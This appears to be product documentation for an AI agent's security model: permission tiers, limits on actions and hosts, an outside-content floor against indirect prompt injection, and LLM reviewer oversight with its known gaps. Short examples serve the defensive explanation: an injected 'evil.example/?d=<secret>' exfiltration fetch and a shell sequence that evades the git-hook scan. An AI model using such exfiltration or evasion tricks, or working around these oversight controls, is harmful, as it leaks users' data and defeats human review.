---
title: "Security model"
description: "Governance in Remit is architecture, not a setting. Every tool call is classified, then run through a permission ladder before it executes, and the…"
---

<p class="rm-synced">Part of the Remit Coworker documentation. Generated from the product's own docs; material written for the people building Remit is left out.</p>

Governance in Remit is architecture, not a setting. Every tool call is
classified, then run through a permission ladder before it executes, and the
outcome lands in a hash-chained journal. The parts that protect you from the
agent are the parts you cannot turn off from inside a conversation.

## Risk classes

Every tool resolves to exactly one class:

| Class | Meaning |
|---|---|
| `read` | no side effects — always allowed |
| `egress` | reaches the network; the request itself can carry data off-machine |
| `write_local` | mutates the workspace — path-scoped and mode-gated |
| `exec` | runs commands — mode-gated |
| `external` | side effects off the machine |

Anything but `read` is **consequential** and must clear the ladder.

You can override a tool's class in `risk_overrides.json`. Overrides may only
ever **raise** strictness relative to a floor — a loosening override on a
floored tool is ignored.

An MCP server's tools are somebody else's code across a socket, and their floor
is `egress`: `external` when the server is marked as needing approval, `egress`
when it is not, and never `read`. A server you mark `requires_approval: false`
still runs without a card in every mode that honours allowlists — that is what
the switch means — but its tools are refused in discuss and plan like any
egress, cannot be loosened below egress by an override, and are audited as what
they are. Before 2026-09-07 that switch made every tool on the server `read`:
always allowed, in every mode, invisible to every floor.

The class a verdict turned on travels with the decision: the `permission_required`
event carries `risk_class` (and `human_only`, set when the reviewer may not clear
the ask), and every audit row records it. Both come from the engine's own
classification rather than being re-derived — under an override, a surface that
guessed from the tool name would disagree with the decision it was describing.

Audit rows written before 2026-09-01 have no recorded class. They are left that
way rather than backfilled: inferring a class for a decision already made would
be a guess, and filtering by class excludes them rather than assuming.

### Which egress paths are actually guarded

The address guard refuses a URL that resolves to this machine, a private range,
carrier-grade NAT, or link-local — which includes the cloud metadata endpoint at
`169.254.169.254`. It exists because a page can talk a coworker into fetching
somewhere only this machine can reach.

It does not cover everything that leaves the machine, and it is worth being plain
about where it does and does not apply.

| path | address-guarded |
|---|---|
| `web_fetch` | **yes** — every hop, with the resolved address pinned so a name cannot change answer between the check and the connection |
| the browser | **yes** — every request the page makes: the navigation, each redirect hop, scripts, images, fetches. Each is checked before it goes out and failed as blocked if it may not, so a page cannot reach a private address on the model's behalf however it tries. Loopback is permitted here: opening a dev server on this machine is what the tool is for. See [the browser](/docs/coworker/using-remit/#the-browser) for what else the session refuses |
| connector calls that opt in | **yes**, per hop, for the requests that ask for it |
| everything else a connector does | **no** — a vendor endpoint is configured, not model-chosen |
| an MCP server fetching a URL for you | **no** — it runs on its own machine, under its own rules or none |
| `run_shell` running `curl` | **no** — governed as `exec`, by the command allowlist and the mode |

The pattern: the guard protects the tools that take a **model-chosen address**.
Where the destination is fixed by configuration — a vendor API, a search
provider, an MCP server you connected — the control is that *you* chose it, not
that the address is checked. And an MCP server that fetches a URL on your behalf
does so on its own infrastructure; nothing here can inspect that.

**So this is not a network boundary.** If you need one — an agent that genuinely
cannot reach your internal network whatever it runs — that belongs in a firewall
or an egress proxy, not in a per-tool check inside the process. What the guard
gives you is that the tools most easily talked into it will refuse.

The classes still apply to all of it: anything reaching the network is `egress`
or `external`, so the mode, the allowlist, the outside-content floor and the
action allowance govern every row of that table whether or not the address is
checked.

### How many, not only whether

The ladder decides whether an action is allowed. Nothing decided **how many**, so
a turn that had gone wrong was bounded only by the iteration limit — which bounds
the loop, not its consequences. Twelve iterations can send twelve messages, and a
single step can batch several calls.

A turn takes **50 actions with effects beyond this machine** on its own. Past
that, every further one reaches a person, and a notice says so — a turn that
quietly started asking about everything, with nothing explaining why, would be
indistinguishable from one that broke.

It never blocks: past the allowance you decide, and if you approve, it runs. The
control is "you are watching now", not "stop".

A wake the coworker set for itself (`sleep_until`) is **not a new turn** for this
allowance, nor for the outside-content floor below. Both reset when a person
speaks or a genuinely new message arrives from a connected platform. A boundary
the model chooses cannot bound the model: read a page, sleep for a second, wake
clean with a fresh fifty was the path, and it is closed.

![Settings, Security and trust: the actions a turn takes on its own, and always-allowed destinations](/docs/images/settings-trust.png)

Fifty is high on purpose. The number has two jobs that want different answers:
as a runaway-loop guard high is fine, and as a bound on a turn acting on injected
instructions it wants to be low — but low is what interrupts honest bulk work,
and a control that interrupts real work gets switched off wholesale while one
nobody meets gets tuned.

The number that actually suits a session depends on what the session is **for** —
five off-machine actions is already odd for a coding session and unremarkable for
an inbox triage. So the global default lives in Settings → Security & trust, and
a session can carry its own in its Access panel. Blank inherits.

Both are clamped to 1–500. The allowance can be raised — a deployment doing
bulk work legitimately needs more — but it cannot be removed, because a budget
that can be set to zero is not a budget, and an extra typed zero should not
quietly take the bound away.

Deliberately `external` only. Egress is high-volume by nature — reading twenty
pages while researching is ordinary work — so counting it would measure diligence
rather than blast radius. And deliberately no exemption for a pinned standing
rule, unlike the floor below: a pinned target bounds *where* effects go and says
nothing about how many, which is the only thing this measures.

### How many places

What the allowance leaves uncounted is breadth. Twenty fetches from one host is
research; twenty **hosts** in one turn is the shape of exfiltration by fragments,
or of a turn spraying whatever it read at whatever it can reach — and until this
floor, a turn that had read nothing from outside could fetch from as many places
as it liked and nothing ever asked.

A turn reaches **25 distinct hosts** on its own. A fetch to the twenty-sixth
reaches a person, and a notice says so. Returning to a host the turn has already
touched costs nothing, however many times: the bound is on places, not calls,
which is what keeps a long research turn clear of it. A call with no destination
of its own — a web search, whose endpoint is the one you configured — is not a
host.

It behaves like the allowance in every other respect. It never blocks: you
decide, and if you approve, the fetch runs and its host joins the turn's reach.
It resets when a person speaks and **not** on a wake the coworker set for
itself. It is `egress_hosts` in the global `config.toml`, clamped to 1–500 —
raisable, never removable — and an organisation's `limits.egress_hosts` can only
lower it. There is no Settings field for it yet.

Two things it deliberately does not do. A host on the always-allowed list still
counts: that list bounds *where* a turn may go without asking, and this bounds
*how many* places it goes, and a turn spreading across twenty-five pinned hosts
is still spreading. And subdomains are separate hosts — `a.example.com` and
`b.example.com` are two — so a spray across the subdomains of one apex meets the
bound sooner rather than later; the honest way to fold them is a public-suffix
list, which is a dependency decision this does not make.

When this floor and the outside-content floor below both apply, the card carries
the content floor's reason, which is the more specific one and names a remedy.

### What a restart does to a card

Every floor above decides from what this turn has done — the allowance spent,
the hosts reached, the content read, the files downloaded — and none of that
survives a restart. The card a floor raised does. So a call that was parked on a
card **answers to that card** when the session resumes: it is not re-judged, no
floor is re-derived, and it goes to you with the card's own reason. If you had
already answered, that answer is what happens; if you had not, you are asked
once. A card is honoured only for the call it was raised for — the same tool,
the same arguments — and never turns a refusal into a question: a session that
now refuses the call refuses it whatever the card said.

This closes two ways a Deny used to be lost. In bypass mode a card only a floor
had raised evaporated on a restart, because the rebuilt session could not see
why it had been raised and allowed the call on its own. And in Auto-approve a
resumed card was put to the reviewer again before your stored answer was read,
so a fresh allow ran the call over your Deny.

### Outside content

Every audit row also carries `outside_content`: whether this **turn** had read
content written off this machine — a web page, an email, an issue, a chat
message, an MCP server's reply. Anything from the `connector`, `mcp`, `web` or
`messaging` categories sets it; `filesystem`, `git`, `shell`, `search` and
`team` are local and do not, so ordinary coding work never sets it.

It exists because indirect prompt injection is the one attack the rest of this
page does not address. Everything else here governs what the agent may do; this
records the one thing the permission engine could not otherwise know — that when
it made a decision, somebody else's words were already in the context. The
system prompt does tell the model to treat external content as data rather than
instructions, but that instruction lives inside the conversation, which is
exactly what injection subverts.

**What follows from it.** An action whose effects leave this machine — anything
classified `external` — reaches a **person** when the turn is marked, over the
reviewer and over full-access mode alike. It is a floor, like the
downloaded-file rule beside it, and for the same reason: the escalation it
blocks happens in modes where every other check has been switched off.

Six conditions bound it, and each is deliberate:

- **`external` or `egress` risk.** External acts somewhere; egress carries data
  out in the request itself. Covering only the first left the readier channel
  open — the simplest thing an injected page can ask for is a fetch of
  `evil.example/?d=<secret>`, and that is egress. A file write or a shell command
  is not covered: those are ordinary work in a turn that consulted documentation,
  and escalating them would make such sessions unusable for very little.
- **A destination chosen in ADVANCE is exempt**, which is what makes egress
  coverage affordable. A domain on the configured allowlist was named before the
  turn existed, so injected text cannot have chosen it — the same argument that
  exempts a pinned standing rule. A session grant ("always allow this domain
  this session") does not exempt: it is a ladder grant, and the floor sits under
  the ladder. A card the floor raised therefore offers **Allow *host* from now
  on** instead, which writes the configured entry — a person naming the host.
  A call with no destination argument at all (`web_search`, the enrichment
  lookups) goes to the endpoint the operator configured, and is pre-declared by
  construction. A Slack reply into a channel a person named in advance under
  **Replies without asking** is a pinned target for the same reason.
- **A hard deny is left alone.** It only ever tightens an allow; it never turns a
  refusal into a question.
- **Exact-target standing rules are exempt** — an automation's, and the standing
  allowances a person teaches from a card (see [Standing allowances](#standing-allowances)). A rule pins the tool *and* the
  destination. Injected text can change what is said; it cannot move a pinned
  target, so the channel an attacker wants is already shut — and overriding
  these would break every automation somebody deliberately set up. A rule can
  pin a connector's recipient, a fetch's host, or the configured search
  provider — never a shell command or a file write, which the tables exclude
  by construction.
- **A mention's reply grant is exempt only for the message that asked.** A
  Slack mention spawns a session that may answer in that thread without a card.
  That target was chosen by the message that arrived, not pinned by a person in
  advance, so the argument above does not carry all the way: the grant answers
  the asker, but a reply composed after the turn has read something *else* — a
  page, an issue, a mail — reaches a person first.
- **Not already human-only.** The downloaded-file floor is more specific and its
  reason is the more useful one to show.

**The board carries it too.** A filing, a comment or a transition written while
the author's turn was marked is recorded as tainted in the hash-chained log, and
a coworker that reads such a record back is marked in turn — a lead handed a
worker's note that quotes a phishing mail does not start clean. The `team`
category is local and never marks on its own; the record says when it should.

[Outside content](/docs/coworker/outside-content/) covers measuring this on your own usage,
testing it end to end, and backing it out if it asks too often.

It matters most in Auto-Approve, for a structural reason. The reviewer is never
shown outside-authored text, which is what stops the reviewer itself being
talked into a verdict — but the same isolation means it cannot see that the
action in front of it was *suggested* by such text. This is the fact that closes
that blind spot, and it comes from the engine, which watched the content arrive.

The stage decides what the field means. On a `proposed` row it is the context
the call was **authorised** in — the one that answers "was this decided while
outside text was in play". On a `finished` row it is the state after the call
ran, so a web fetch's own finished row is set by its own result. Rows written
before 2026-09-01 have no value, for the same reason as the class above.

### Outside content and the Grapevine

The same rule, one hop further out. A coworker that publishes to the Grapevine
after reading outside content produces a post that **wakes nobody** — it waits on
the screen for a person instead. A post is one coworker's words arriving in
another coworker's context with the power to make it act, which is the shape an
injected instruction wants; and fetching such a post's output marks the fetching
turn the same way, so the mark travels with the work rather than stopping at the
approval card.

There is a second bound beside it, for a failure that is not injection at all:
every post remembers which coworkers it descends from, a coworker is never woken
by a post its own work caused, and a post more than four handoffs from a human
turn wakes nobody. Waking is immediate, so two coworkers listening to each other
would otherwise talk at machine speed ([the Grapevine](/docs/coworker/grapevine/)).

## Modes

| Mode | Behaviour |
|---|---|
| `discuss` | read-only conversation: no edits, no planning workflow |
| `plan` | read-only, plus the planning contract (explore → propose plan → execute) |
| `interactive` | the default: consequential actions ask |
| `custom` | interactive, plus the tools listed in `auto_allow` run without asking |
| `auto-approve` | an LLM reviewer judges what would otherwise be an approval card |
| `bypass-approvals` | full access — **the hard floors still hold** |

## The ladder

Checks run in this order. The early ones are floors: no mode, allowlist,
reviewer verdict or click in the interface can get past them.

**1. Self-protection floor.** Writes and shell commands that touch Remit's own
settings are refused outright. This runs *before* mode and every auto-approve
path, because the escalation it blocks happens in the default mode. Loosening it
requires editing files out-of-band — there is deliberately no in-flow way to
grant it.

**2. Read-only modes.** In `discuss` and `plan`, anything consequential stops
here.

**3. Path scoping for writes.** Every path a write touches must resolve inside a
writable root. A write whose path *cannot be located* is not scopeable, so it
**fails closed** to human approval rather than slipping through `auto-approve`
or `custom` unscoped.

**4. Protected in-project files.** Files that execute on some later action — git
hooks, CI configs — may be edited, but never by an auto-approve path. A person
has to see it. That includes an automation's own approver, which otherwise
clears ordinary local writes so an unattended run can proceed: a human-only ask
parks in the Inbox for a person like anything else the run is not allowed.
For a write tool the path is resolved and checked. For a shell command only the
command's text is scanned for the same markers, which is a speed bump and not a
boundary: `cd .git && cd hooks && cat > post-commit` spells none of them, and
neither does a path built in a variable. It stops accidents and casual
attempts; real containment is an OS sandbox, which Remit does not have yet.

**5. Persistent authority.** Tools whose effect outlives the session reach a
person, over the reviewer and over every allowlist.

**5a. Another coworker's work.** `grapevine_fetch` — reading a file out of the
folder another coworker did its work in — reaches a person the first time, in
every mode including bypass, and is never cleared by the reviewer. A mode that
stops the asking is about a coworker's own reach; it says nothing about whose
data may move where, and the reviewer has no standing to answer that on your
behalf. It is a named floor rather than a risk class because no class fits: the
call is local and cheap, and still yours ([the Grapevine](/docs/coworker/grapevine/)).

It is the one named floor that honours a **session grant**, and it honours one in
every mode: on a human-only ask the person is the only judge, so their *Always
allow for this session* skips nobody — the rule that an in-flow click may not
skip the reviewer has no reviewer to skip here. The grant is per session, listed
and revocable, and nothing a coworker does can write it. Every surface the ask
can reach offers it — the live card and the parked Inbox card carry the same two
facts, that only a person may answer and that the grant would be honoured — and
a session started with its *Ask before reading another coworker's work* switch
off holds it from its first turn.

**6. Non-consequential tools** run.

**7. Allowlists**, in order: config `allowed_commands` → session grants ("always
allow this…", kept with the session until revoked) → standing rules, themselves
in order: an automation's task-scoped rules, then a target a person named in
advance — a standing allowance, a host on the no-asking list, a Slack reply
channel — then a mention thread's grant → `custom` mode's `auto_allow` →
otherwise ask.

In `auto-approve`, session grants deliberately do **not** auto-allow. Out-of-band
standing policy may skip the judge; an in-flow click may not. Those calls route
to the reviewer instead. A standing rule is the exception in every mode
including bypass, because it names an exact target a person chose in advance —
which is also why the outside-content floor exempts it and the session grant
beside it does not.

### Who may answer a card from a chat

A card mirrored to Slack or Telegram can be answered there, and "a person" has to
mean the right person. On Slack that is an **approval owner**, a list per
workspace that is separate from who may talk to the bot. Other platforms have no
owner list, so there the explicit allow-list stands in for one: only someone
whose id is on it can approve an action, grant a folder, approve a plan or
install a tool from the chat. Allowing everyone lets anyone in the chat talk to
the coworker and answer its questions, never approve what it does. A refused
reply changes nothing, and it is not passed to the coworker as a message.

An answer from someone the allow-list does not name is kept, and it carries none
of your authority. The coworker gets the words it asked for, but they do not
count as your consent for what was asked. They do not lift the reviewer's pause
after repeated denials. The turn treats them the way it would treat that
person's message: as content from outside this machine, so anything the
coworker then does that leaves the machine reaches a person first.

Telegram shows no buttons, so a card mirrored there carries its choices and its
token as text. Reply with one of the choices and the token, for example
`approve [ow:…]`. The same rules decide whose reply counts.

## What consent can and cannot tell you

Installing a coworker shows what it **may** do: its tools, its connectors, the
risk classes those imply. That is what consent gates, and it is enforced — a
coworker cannot use a tool it did not declare, and every call still passes the
ladder and the hard floors.

Consent cannot gate what a coworker is **told** to do. Nobody can reliably audit
a prompt for intent, and Remit does not pretend to: the instructions and any
skills are shown, verbatim, under "Read its instructions" on the consent card,
and nothing analyses them. They are there so a careful person can read them, not
because reading them makes anyone safe.

The two questions are different and worth holding apart:

- **May it read your files and reach the network?** The consent screen answers
  this, and the answer is binding.
- **What will it do with that?** Its instructions decide, and they are text
  written by whoever published it.

A coworker declaring `files` and a network tool has been granted the ability to
read something and send it somewhere. That combination is visible at install
time and is the thing to think about — not because a coworker is likely to be
hostile, but because "it only had the tools I approved" is true and not
sufficient.

Skills deserve particular attention. They are behaviour, they arrive with a
shared coworker, and they run on the machine of whoever installs it. On a
self-hosted gallery the operator who approves an upload is the one human who
reads them before the whole company can install — `remit-broker gallery show`
exists for exactly that, and it is a real control precisely because a person
does it.

## Standing allowances

The reviewer is judgement; a standing allowance is a rule. It is the deterministic
half of teaching a coworker what is acceptable: a person names one tool against one
exact target, once, and every session honours it from then on — in every mode,
even after the turn has read something from outside this machine, because the
destination was named by a person in advance, which is the one condition the
outside-content floor exempts. Nothing a model concludes can create one, widen one
or remove one.

Where they come from. An approval card for a call that names an exact target — a
repository, a project, a team, a page, a message address — offers **Allow every
time against *target***. Pressing it approves that call once and writes the rule.
An automation's card offers the same button scoped to the automation instead,
because an automation's rules belong to the automation. A fetch card offers the
host under Always-allowed destinations, and a Slack reply the channel under
Replies without asking; those two lists are standing allowances by another name.

What one is, exactly. `tool → target`, nothing looser: `github_create_issue →
syphon1c/ai_remit`, `jira_create_issue → SEC`, `send_email → ops@example.com`. There
are no wildcards and no tool-wide entries, because the exact target is the whole
safety argument — a page can shape what is said to a pinned destination, never
where it goes. A tool that acts without naming a target, and every exec or
destructive tool, can never carry one; the set of eligible tools is pinned by a test
and widened only on purpose.

Where they live. **Settings ▸ Security & trust ▸ Standing allowances** lists every
rule with the session and call that taught it, and removes it live. Each use is an
`auto_allowed` audit row citing the rule; teaching one writes
`standing_allowance_added`, removing one `standing_allowance_removed`. An
organisation can forbid teaching them with the policy key
`standing.allowances.allowed`; a refused attempt is downgraded to a one-time
approval and audited, never silently kept. That switch governs **teaching**, not
what has already been taught: allowances a person pinned before it was turned off
keep working, and are removed by that person, here, one at a time. An
organisation that wants one gone asks for it; a policy does not reach into a
machine and un-teach. The Cloud's key says so in its own words, so nobody issues
it believing it revokes anything (owner ruling 2026-09-08).

## Workspace trust

A repository you clone can ship its own `.coworker/config.toml`. Remit will not
honour its `allowed_commands` until you have trusted **that exact canonical
workspace path**. Until then they are advisory — visible, not active.

Other permission grants (`auto_allow`, `allowed_domains`, `auto_approve`) are
user-global only and can never be set by a project at all. See
[configuration](/docs/coworker/configuration/#what-a-project-may-not-set).

## Commands are not allowlisted by default

`allowed_commands` ships empty, and that is deliberate. There is no generally
safe executable: nominally read-only programs can read secrets outside the
workspace, expand environment variables, load project-controlled config or
plugins, and execute helpers — `find -exec` and pytest collection are the usual
examples. Adding a prefix is you accepting that authority for that prefix.

## The reviewer

In `auto-approve` mode an LLM reviewer judges approval cards. Two properties
matter:

- Its verdicts **fail closed**: anything it is unsure about parses to "unsure"
  and goes to you.
- `auto_approve_shadow` runs it in shadow: it records what it *would* have
  decided next to your actual decision, changing nothing. That is the honest way
  to find out whether you would trust it, and it costs one model call per card.

Both are user-global only, and both reach sessions already open: the engine
reads them at the card, not when it was built.

**How hard the judge thinks.** The reviewer's reasoning effort is its own
setting — `reviewer_effort`, or **Settings ▸ Models ▸ Reviewer effort** — on one
scale (`low`, `medium`, `high`, `max`, or the model's default) that Remit maps to
whatever the reviewer's model takes, and sends nothing where it takes none. It is
global-only for the reason the reviewer model is, and the reviewer never inherits
a session's effort: what the actor was asked to spend on the work says nothing
about what the judge should spend on the verdict. The done-when critic, which
judges on the reviewer model, judges at the reviewer's effort too. Read on every
consult, so a change reaches sessions already open.

**What shadow records, and on which cards.** A shadow verdict is taken only where
the live path would have consulted the reviewer: an attended session, and a card
the reviewer may clear — never a human-only card (a downloaded file, the
outside-content and budget floors, a protected write), never an unattended run.
Anything else would be a decision auto-approve could never take, counted as
though it were one. The card the shadow judge sees is the card the live judge
would see, mode included. The verdict is written for you and reaches you: as a
line under the step once you have decided (*reviewer would have allowed:* …),
in the conversation's **Reviewer** panel, and across every session under the
switch in Settings — each shadow verdict beside what you did with the same card.
The line that decides trust is *would have allowed what you refused*: the
reviewer would have let through something you stopped, and it is the one line
marked. Both readouts slice by the model that judged and by the class of card,
so "how does this reviewer do on shell commands" is one pick away, which is
what choosing a reviewer model needs; with a second judge on the record, each
judge has a block of its own, read beside the other rather than instead of it.
Nothing here ever decides.

**What the row says.** A verdict row's `status` is the verdict — `allow`, `deny`,
`unsure` — or `error` when the machinery produced none: a timeout, a provider
error, the reviewer unavailable by policy. The engine treats an error as unsure
(you decide); the record keeps the two apart, so a flaky provider cannot read as
a hesitant reviewer. Shadow rows carry the same `risk_class` and
`outside_content` stamps as every other tool-call row.

**The reviewer is not the actor.** It judges with the *reviewer model*, not the
session's model: by default the cheapest curated model of the same family (Haiku
for Claude, Luna for GPT-5.6 and GPT-6, Flash for Gemini), or whatever **Settings ▸ Models**
pins. A model reviewing its own plan shares its blind spots; a second opinion is
only a second opinion when it is a second model. The done-ness critic uses the
same reviewer model. An organisation can require the separation with the policy
key `reviewer.separate`: when it holds and the reviewer would be the acting model,
the reviewer is unavailable by policy — every verdict is *unsure*, so every card
reaches you, and the session says why once. Refused at the point of use, never
satisfied by quietly picking something.

**Which judge may see a card.** A second policy key, `reviewer.allowed_judges`,
says which judge *backends* an organisation permits. It composes like every
allow-set — by intersection, tightening only — and it has one rule the others do
not: **a document that omits the local judge is refused.** An organisation can
take away a judge that sends cards off the machine; it can never require one. A
policy that made a protection depend on a third-party paid API would be a policy
that fails a customer open the day that API is unreachable, unpaid or withdrawn,
and the promise below — that every protection works signed out, offline and
unlicensed — would stop being true. The restriction is read per card, not once
per session, so revoking a judge takes effect on the next action rather than on
the next restart.

**A note for organisations with `reviewer.separate` locked.** That lock asks that
the reviewer not be the acting model. A judge that is not a chat model at all
satisfies it by construction, and for one release it suppressed such a judge
anyway — not because the lock was about it, but because there was no other way
for an organisation to say whether cards could leave the machine. There is now,
so the lock means what it says again.

**Read the next sentence before the one after it.** That suppression was never
fleet-wide: it followed the lock's own test, which fires only where the resolved
reviewer model *is* the acting model — the failure the lock exists to catch. On a
machine that satisfies the lock properly, with a distinct reviewer model, the
typed judge was never suppressed. So if your machines have a TypeSafe key,
`reviewer_shadow_judge = "typesafe"` and shadow evaluation on, **cards have been
reaching `api.typesafe.ai` since that judge shipped** — the upgrade changes only
the machines where the lock was actually biting, which are the machines that were
already failing it. If this is news, the period to look at starts before the
upgrade and not at it.

Either way the remedy is the same key: `reviewer.allowed_judges: ["model"]`. Those
three local switches are the machine owner's and were never yours to set; this
key is.

**What the reviewer is told.** Beside the request, your earlier words and the one
action, the card now carries the facts the engine decides floors on: the action's
risk class, the session's mode, and whether the turn has read content written off
this machine. The reviewer is never shown that content — that is what stops it
being talked into a verdict — so this is how it learns the action may have been
suggested by it. Every verdict row names the model that judged.

**The known world.** The reviewer is also told where you were already working:
the session's folders and the git remotes, frozen when the session started. The
freeze is deliberate — compared against live state, a coworker that adds a
remote would make its own destination look familiar. A folder is different: a
coworker cannot add one, it can only ask, and only your answer to that card adds
it. So a folder you grant mid-session joins the block on the next card, marked
*granted by you*, and leaves it if you take the folder away; the frozen part
stays as captured. Remotes added mid-session stay unknown, because that is the
case the freeze exists for.

**Your answers count, and they keep.** When a coworker asks you a question and
you answer, the reviewer is shown your answer beside the question — the
question marked as the coworker's own words, so the answer is weighed as
consent for exactly what was asked, not for everything. Those answers are kept
with the session, like its plan and its grants, so a restart or an idle
eviction does not make the judge forget what you agreed to and start asking
again.

### A second judge, off the machine

Remit can ask a second judge about the same cards: TypeSafe's **Jev**, a model
that answers typed questions — a probability, a choice from a fixed list, a level
on a rubric — rather than writing a reply. It is off by default, and **in this
build it decides nothing.** What it does is write a row beside the one the
deciding judge wrote, so the two can be compared before anyone is asked to trust
it. It cannot be made to decide by any setting: the only way to build a reviewer
over this judge hands back a type with no way to be consulted live, so making it
decide is a change to the code, not to a switch.

**Nothing leaves the machine unless three separate things are true.** A
`TYPESAFE_API_KEY` resolves, *and* the judge is switched on
(`reviewer_shadow_judge = "typesafe"`), *and* shadow evaluation is on. All three
live on one card, **Settings ▸ Security & trust ▸ A second judge**: the key — a
test that passes saves it, the contract every provider key field keeps — one
switch, and where it stands, at a glance in the title row (*Not set up*, *Key
saved*, *Running · last verdict 7m ago*) and in a sentence. The switch writes the
same setting the config line does and turns shadow evaluation on with it, and it
applies to
sessions started after it — a session already open keeps the judge it was built
with. None of the three is enough alone, which is deliberate: a key may already
be on the machine for another tool, and turning on shadow evaluation is a
decision about measuring the reviewer, not a decision to send this machine's
work to a third party. An organisation can remove the choice entirely with
`reviewer.allowed_judges`; the card then says so and the switch is refused at
the endpoint, not saved and ignored.

**One caution about that.** The key is read once, when a session is built, and the
environment is read before the stored secret. So the switch on with no key is not
inert — it is armed. The day a `TYPESAFE_API_KEY` appears in the process
environment, for whatever reason, the next session builds the judge and cards
begin leaving, with no prompt and no log line. If you are not using this, switch
the judge off rather than relying on the key's absence. The same fact runs the
other way: clearing the key does not stop a session already open, which keeps
the judge it was built with until it ends. Only the policy key is immediate.

**What is sent.** One HTTPS request per card to `api.typesafe.ai` — up to three,
since a rate-limited or overloaded send is retried with the same body. It carries
the six questions with their instructions and rubrics, the pinned model name, and
a state object of ten named fields: the current user message (clipped at 2000
characters), earlier user messages in this session (200 each, with no limit on
how many), the session's folders and git remotes, the proposed action's tool name
and arguments, and five computed facts — whether the file was made by the agent,
the risk class, the session's mode, whether the turn has read outside content, and
whether the destination is a host you already work with (true, false, or null when
the action names no destination it can read). There is no session id and no copy
of the system prompt.

**It is not anonymous.** The request is authenticated with your TypeSafe key, so
the vendor can attribute every card to that account. And the state names you
without meaning to: folder paths are sent as captured, which on most machines
includes your home directory and username, and a git remote URL names your host,
your organisation and your repository — the same strings on every card, in every
session.

**The arguments are sent in full, and that is the part to weigh.** They are not
clipped, summarised or redacted. The judge is asked whether text inside them is
addressed to *it* — the one adversarial question on the card — and that cannot be
answered on redacted arguments. So if a coworker has read a web page or a file and
now proposes to write it somewhere or post it, that text is in the arguments and
it goes. It also means a file that carries such text, copied verbatim because you
asked for a copy, reads to the judge exactly like the attack it came from: the
judge sees the arguments and nothing else, and it cannot tell a copy from an
instruction. Such a copy is refused by the typed judge's manipulation rung, and
that is deliberate — a blocked copy is the fail-closed answer for a rare shape,
and you can make the copy yourself or in a mode that asks.

**"The current user message" is a message you wrote, and it used to be looser
than that.** The field is the session's last user-role turn — and `role: "user"`
is the conversation's shape, not a claim about authorship. Remit writes user-role
turns that no person typed: a message delivered by a connected Slack, Teams,
Discord or mail account, a teammate's board post, a Grapevine post from another
coworker, a self-wake the agent scheduled for itself, and the runtime's own
prose when it nudges the model about an unfinished plan or a step limit. Each of
those used to be able to become the standard your action was judged against, so
the judge was asked "is this within what the user asked for" about words you
never said — and, with a typed judge configured, sent them to
`api.typesafe.ai`. They are all marked now and none of them is taken as your
request or as your earlier words.

The cost is stated rather than hidden: when a turn is driven entirely by one of
them, there is no request to judge against, and a card with no request **reaches
you** instead of being decided. That is the direction the engine errs in, and it
means a busy connected session asks more often, not less.

One turn is still unmarked, by decision rather than by oversight: an automation
opens with the instructions you stored when you created it, wrapped in a line
telling the coworker to carry them out now. The instructions are your words,
written earlier, and they arrive in the same message as the wrapper, so marking
the turn would throw your brief away with the framing. A scheduled run never
reaches the reviewer anyway — nobody is attending it. **A manual Run now does**:
it opens an ordinary session you are watching, so with auto-approve on, that
whole opening is the request the judge is handed, framing included, and it goes
to `api.typesafe.ai` with the card.

**What is never sent is a tool's result.** No page text, file contents or message
body reaches the card *as a result* — the card has eight fields and none of them
is that channel, held by a test over the field list rather than by a filter. Read
the shape of that guarantee carefully, because the paragraphs above are its
limit: content the coworker has already read can still arrive inside an action it
proposes, and that is where a stranger's words reach the judge now that they no
longer arrive as the request.

**On your own journal, which redacts less than you may assume.** Remit's
hash-chained audit journal redacts a top-level `content`, `body` or `html`
argument, and a top-level name containing *token*, *secret*, *password* or
*api_key*. That walk is one level deep. A secret nested inside an object — an
`Authorization` header under `headers`, a password under `json` — is stored in
the clear, clipped at 500 characters. This is a property of the journal itself and
is not about this judge; it is here because a reader weighing what leaves the
machine should not be told the local record is stricter than it is.

**A git remote URL is sent as `git remote -v` prints it.** If yours embeds a
credential, the credential goes. The reviewer that has always run is told the same
remotes, so this is not new — but it is not equivalent either, because the two
judges are not always both consulted. It is recorded as a defect to fix at the
capture point, so that neither path can carry it.

**Where it goes, and what happens there.** The endpoint is fixed at
`https://api.typesafe.ai`; nothing in configuration or policy can point it
somewhere else. In particular **`model_proxy_url` does not apply to it** — an
organisation that has pinned every model call to its own gateway has not pinned
this one, and its only lever is `reviewer.allowed_judges`, which is all or
nothing. `HTTPS_PROXY` and `NO_PROXY` are honoured, since the client uses Go's
default transport; TLS is verified against the system roots, with no pinning.
**This document does not tell you what TypeSafe does with a card** — retention,
logging, training, jurisdiction, deletion — because Remit does not know and should
not imply otherwise. If you are weighing the disclosure above, weigh it against
their terms, not against silence here.

**With no key, nothing about your protection changes.** No client is built and no
judge exists — not a judge that fails, a judge that is absent. The five risk
classes and the permission ladder are in packages that do not import the reviewer
or TypeSafe at all, directly or transitively, and cannot reach either. The floors
and the rule that an unresolved card reaches a person live in the engine, which
does know about judges — what makes them independent is not the package boundary
but the order: a floor marks a card as human-only before a verdict is read, and
the branch that could act on one requires that mark to be absent. There is no
licence check, no entitlement check and no sign-in check on any of it: signed out,
offline and unlicensed, every protection in this document works exactly as it does
with a key. The lattice enforces that positively rather than merely not violating
it — a policy document that tried to make Jev the only permitted judge is refused,
so governance can never be made to depend on a third-party API.

**When that API is unreachable, nothing changes either, and not for a comforting
reason.** The verdict is an error, the row records `error` rather than `unsure` so
a flaky endpoint cannot later read as a hesitant judge — and then it is discarded,
because this judge decides nothing. An outage does not send anything to a person
who would not have been asked anyway. Do not read a second judge as a second net:
it is not attached to anything yet.

**It cannot remove a floor, and today it cannot remove a click either.** The floors
mark a card as human-only, and the typed judge is never asked about such a card.
There is no configuration in this build that makes Jev the deciding judge: it is
held in a type with no `Review` method, so wiring it to the live path does not
compile. Its thresholds are unmeasured placeholders, recorded as such in the
source, and nothing has ever been denied by them.

**No journal, no call.** The judge runs only where its row can be written. A
session with no audit sink — the terminal binary writes none — does not send the
card at all, because a card that leaves with nothing recording that it left is the
one outcome this path exists to avoid.

**On `reviewer.separate`.** That lock requires the reviewer not to be the acting
model, and it is a string comparison between two chat models. It is not
*satisfied* by a typed judge — it is not *applied* to one. Where the lock bites,
the chat judge is unavailable and every card reaches you, while a typed shadow
judge, if you have configured one, keeps recording. If that is not what you want,
`reviewer.allowed_judges: ["model"]` is the key that says so.

**A gap, named rather than left to be discovered.** Setting
`reviewer_shadow_judge = "typesafe"` with no key produces no judge, no row, no
warning and no log line. The field and the Test button that would say so are not
built yet.

## Audit

Every decision is appended to a hash-chained log carrying its own provenance:
